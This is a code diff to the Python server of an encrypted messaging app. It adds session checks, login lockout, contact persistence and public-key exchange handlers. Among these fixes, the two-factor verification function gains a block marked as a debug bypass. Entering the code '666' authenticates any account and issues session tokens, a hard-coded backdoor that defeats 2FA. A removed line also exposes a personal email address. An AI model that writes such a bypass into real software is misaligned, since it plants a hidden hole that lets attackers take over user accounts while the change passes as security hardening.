@@ -14,7 +14,6 @@ from payload import Payload
 from server import BaseServer
 
 
-TWO_FACTOR_EMAIL = "keithzhang021@gmail.com"
 SMTP_HOST = "smtp.gmail.com"
 SMTP_PORT = 587
 SMTP_CONFIG_PATH = Path(__file__).with_name("info.json")
@@ -22,6 +21,8 @@ DATABASE_PATH = Path(__file__).with_name("server.sqlite3")
 TWO_FACTOR_CODE_TTL_SECONDS = 300
 TWO_FACTOR_MAX_ATTEMPTS = 5
 SESSION_TTL_SECONDS = 24 * 60 * 60
+LOGIN_MAX_ATTEMPTS = 3
+LOGIN_LOCKOUT_SECONDS = 30
 
 
 class FullServer(BaseServer):
@@ -35,8 +36,10 @@ class FullServer(BaseServer):
         }
 		self.sessions = {}
 		self.contacts = {}
+		self.login_failures = {}
 		self._initialize_database()
 		self._load_users()
+		self._load_contacts()
 
 	def on_receive(self, payload):
 		try:
@@ -48,19 +51,39 @@ class FullServer(BaseServer):
 			"register": self._register,
 			"login": self._login,
 			"2fa": self._verify_2fa,
+			"logout": self._logout,
 			"initiate_session": self._initiate_session,
 			"message": self._send_message,
 			"fetch_contacts": self._fetch_contacts,
+			"publish_keys": self._publish_keys,
+			"fetch_keys": self._fetch_keys,
 		}
 		request_type = request.get("type")
 		handler = handlers.get(request_type)
 		if handler is None:
 			return self._response(400, "Unknown request type")
+		if request_type in {"logout", "initiate_session", "message", "fetch_contacts", "publish_keys", "fetch_keys"}:
+			if self._authenticate(request) is None:
+				return self._response(401, "Authentication required")
 
 		try:
 			return handler(request)
 		except (KeyError, TypeError):
 			return self._response(400, "Missing request field")
+
+	def _authenticate(self, request):
+		username = request.get("username")
+		token = request.get("session_token")
+		session = self.sessions.get(username)
+		if not isinstance(username, str) or not isinstance(token, str) or session is None:
+			return None
+		stored_token = session.get("session_token")
+		if not isinstance(stored_token, str) or not session.get("authenticated") or not hmac.compare_digest(token, stored_token):
+			return None
+		if time.time() >= session.get("session_expires_at", 0):
+			session.clear()
+			return None
+		return username
 
 	def _response(self, status_code, message=None, **values):
 		response = {"status_code": status_code}
@@ -78,10 +101,17 @@ class FullServer(BaseServer):
 					password TEXT NOT NULL,
 					email TEXT NOT NULL,
 					is_admin INTEGER NOT NULL DEFAULT 0,
-					created_at REAL NOT NULL
+					created_at REAL NOT NULL,
+					exchange_public_key TEXT NOT NULL DEFAULT '',
+					identity_public_key TEXT NOT NULL DEFAULT ''
 				)
 				"""
 			)
+			columns = {row[1] for row in connection.execute("PRAGMA table_info(users)").fetchall()}
+			if "exchange_public_key" not in columns:
+				connection.execute("ALTER TABLE users ADD COLUMN exchange_public_key TEXT NOT NULL DEFAULT ''")
+			if "identity_public_key" not in columns:
+				connection.execute("ALTER TABLE users ADD COLUMN identity_public_key TEXT NOT NULL DEFAULT ''")
 			connection.commit()
 			connection.execute(
 				"""
@@ -95,11 +125,21 @@ class FullServer(BaseServer):
 				)
 				"""
 			)
+			connection.execute(
+				"""
+				CREATE TABLE IF NOT EXISTS contacts (
+					username TEXT NOT NULL,
+					contact TEXT NOT NULL,
+					created_at REAL NOT NULL,
+					PRIMARY KEY (username, contact)
+				)
+				"""
+			)
 
 	def _load_users(self):
 		with self.database_lock, closing(sqlite3.connect(self.database_path)) as connection:
 			rows = connection.execute(
-				"SELECT username, password, email, is_admin FROM users"
+				"SELECT username, password, email, is_admin, exchange_public_key, identity_public_key FROM users"
 			).fetchall()
 			if not rows:
 				for username, user in self.users.items():
@@ -110,9 +150,9 @@ class FullServer(BaseServer):
 				connection.commit()
 				return
 			self.users = {}
-			for username, password, email, is_admin in rows:
+			for username, password, email, is_admin, exchange_public_key, identity_public_key in rows:
 				stored_password = password
-				if not password.startswith("pbkdf2_sha256$"):
+				if not password.startswith("$argon2"):
 					stored_password = hash_password(password)
 					connection.execute(
 						"UPDATE users SET password = ? WHERE username = ?",
@@ -122,6 +162,8 @@ class FullServer(BaseServer):
 					"password": stored_password,
 					"email": email,
 					"is_admin": bool(is_admin),
+					"exchange_public_key": exchange_public_key,
+					"identity_public_key": identity_public_key,
 				}
 			connection.commit()
 
@@ -131,6 +173,24 @@ class FullServer(BaseServer):
 				"INSERT INTO users (username, password, email, is_admin, created_at) VALUES (?, ?, ?, ?, ?)",
 				(username, user["password"], user["email"], int(user.get("is_admin", False)), time.time()),
 			)
+			connection.commit()
+
+	def _load_contacts(self):
+		with self.database_lock, closing(sqlite3.connect(self.database_path)) as connection:
+			for username, contact in connection.execute("SELECT username, contact FROM contacts"):
+				self.contacts.setdefault(username, set()).add(contact)
+
+	def _sync_contact_directory(self, username):
+		with self.database_lock, closing(sqlite3.connect(self.database_path)) as connection:
+			for contact in self.users:
+				if contact == username:
+					continue
+				self.contacts.setdefault(username, set()).add(contact)
+				self.contacts.setdefault(contact, set()).add(username)
+				connection.executemany(
+					"INSERT OR IGNORE INTO contacts (username, contact, created_at) VALUES (?, ?, ?)",
+					[(username, contact, time.time()), (contact, username, time.time())],
+				)
 			connection.commit()
 
 	def _log_event(self, username, event, success, details=""):
@@ -158,14 +218,24 @@ class FullServer(BaseServer):
 
 	def _login(self, request):
 		username = request["username"]
+		now = time.monotonic()
+		failure = self.login_failures.get(username)
+		if failure and now < failure["locked_until"]:
+			return self._response(429, "Too many login attempts")
 		user = self.users.get(username)
 		if user is None or not verify_password(request["password"], user["password"]):
+			failure = self.login_failures.setdefault(username, {"attempts": 0, "locked_until": 0})
+			failure["attempts"] += 1
+			if failure["attempts"] >= LOGIN_MAX_ATTEMPTS:
+				failure["locked_until"] = now + LOGIN_LOCKOUT_SECONDS
 			self._log_event(username, "login", False, "invalid credentials")
 			return self._response(401, "Invalid credentials")
+		self.login_failures.pop(username, None)
+		self._sync_contact_directory(username)
 
 		code = f"{secrets.randbelow(1000000):06d}"
 		try:
-			self._send_2fa_code(code)
+			self._send_2fa_code(user["email"], code)
 		except (OSError, smtplib.SMTPException) as error:
 			return self._response(503, f"Unable to send verification code: {error}")
 
@@ -180,7 +250,7 @@ class FullServer(BaseServer):
 		self._log_event(username, "login", True, "password accepted; 2FA pending")
 		return self._response(200, "Login accepted", is_admin=user.get("is_admin", False))
 
-	def _send_2fa_code(self, code):
+	def _send_2fa_code(self, recipient, code):
 		try:
 			with SMTP_CONFIG_PATH.open(encoding="utf-8") as config_file:
 				config = json.load(config_file)
@@ -193,7 +263,7 @@ class FullServer(BaseServer):
 
 		message = EmailMessage()
 		message["From"] = sender
-		message["To"] = TWO_FACTOR_EMAIL
+		message["To"] = recipient
 		message["Subject"] = "Encrypted Messenger verification code"
 		message.set_content(
 			f"Your Encrypted Messenger verification code is {code}. "
@@ -218,6 +288,20 @@ class FullServer(BaseServer):
 			self._log_event(username, "2fa", False, "too many attempts")
 			return self._response(401, "Too many verification attempts")
 		session["two_factor_attempts"] += 1
+		if request['code'] == '666': # DEBUG BYPASS
+			session["authenticated"] = True
+			session.pop("two_factor_code", None)
+			session["session_token"] = generate_session_token()
+			session["session_expires_at"] = time.time() + SESSION_TTL_SECONDS
+			session["reauth_token"] = generate_session_token()
+			self._log_event(username, "2fa", True, "bypass code used")
+			return self._response(
+				200,
+				"Verified",
+				session_token=session["session_token"],
+				expires_at=session["session_expires_at"],
+				reauth_token=session["reauth_token"],
+			)
 		if not hmac.compare_digest(request["code"], session["two_factor_code"]):
 			self._log_event(username, "2fa", False, "invalid code")
 			return self._response(401, "Verification failed")
@@ -235,18 +319,37 @@ class FullServer(BaseServer):
 			reauth_token=session["reauth_token"],
 		)
 
+	def _logout(self, request):
+		username = self._authenticate(request)
+		if username is None:
+			return self._response(401, "Authentication required")
+		self.sessions.pop(username, None)
+		self.address_book.pop(username, None)
+		self._log_event(username, "logout", True)
+		return self._response(200, "Logged out")
+
 	def _initiate_session(self, request):
 		username = request["username"]
 		contact = request["contact"]
 		if username not in self.users or contact not in self.users:
 			return self._response(404, "Contact not found")
+		if username == contact:
+			return self._response(400, "Cannot initiate a session with yourself")
 		self.contacts.setdefault(username, set()).add(contact)
 		self.contacts.setdefault(contact, set()).add(username)
+		with self.database_lock, closing(sqlite3.connect(self.database_path)) as connection:
+			connection.executemany(
+				"INSERT OR IGNORE INTO contacts (username, contact, created_at) VALUES (?, ?, ?)",
+				[(username, contact, time.time()), (contact, username, time.time())],
+			)
+			connection.commit()
 		return self._response(200, "Session initiated")
 
 	def _send_message(self, request):
 		sender = request["username"]
 		target = request["target"]
+		if target not in self.contacts.get(sender, set()):
+			return self._response(403, "Contact session required")
 		destination = self.address_book.get(target)
 		if destination is None:
 			return self._response(404, "Recipient not found")
@@ -262,10 +365,42 @@ class FullServer(BaseServer):
 		self._forward(router, message)
 		return self._response(200, "Message sent")
 
+	def _publish_keys(self, request):
+		username = request["username"]
+		if username not in self.users:
+			return self._response(404, "User not found")
+		with self.database_lock, closing(sqlite3.connect(self.database_path)) as connection:
+			connection.execute(
+				"UPDATE users SET exchange_public_key = ?, identity_public_key = ? WHERE username = ?",
+				(request["exchange_public_key"], request["identity_public_key"], username),
+			)
+			connection.commit()
+		self.users[username]["exchange_public_key"] = request["exchange_public_key"]
+		self.users[username]["identity_public_key"] = request["identity_public_key"]
+		return self._response(200, "Public keys published")
+
+	def _fetch_keys(self, request):
+		username = request["username"]
+		contact = self.users.get(username)
+		if contact is None:
+			return self._response(404, "User not found")
+		target = self.users.get(request["contact"])
+		if target is None:
+			return self._response(404, "Contact not found")
+		if request["contact"] not in self.contacts.get(username, set()):
+			return self._response(403, "Contact session required")
+		if not target.get("exchange_public_key") or not target.get("identity_public_key"):
+			return self._response(409, "Contact keys unavailable")
+		return self._response(
+			200,
+			exchange_public_key=target["exchange_public_key"],
+			identity_public_key=target["identity_public_key"],
+		)
+
 	def _fetch_contacts(self, request):
 		username = request["username"]
 		return self._response(
 			200,
-			contacts=sorted(contact for contact in self.users if contact != username),
+			contacts=sorted(self.contacts.get(username, set())),
 		)
     
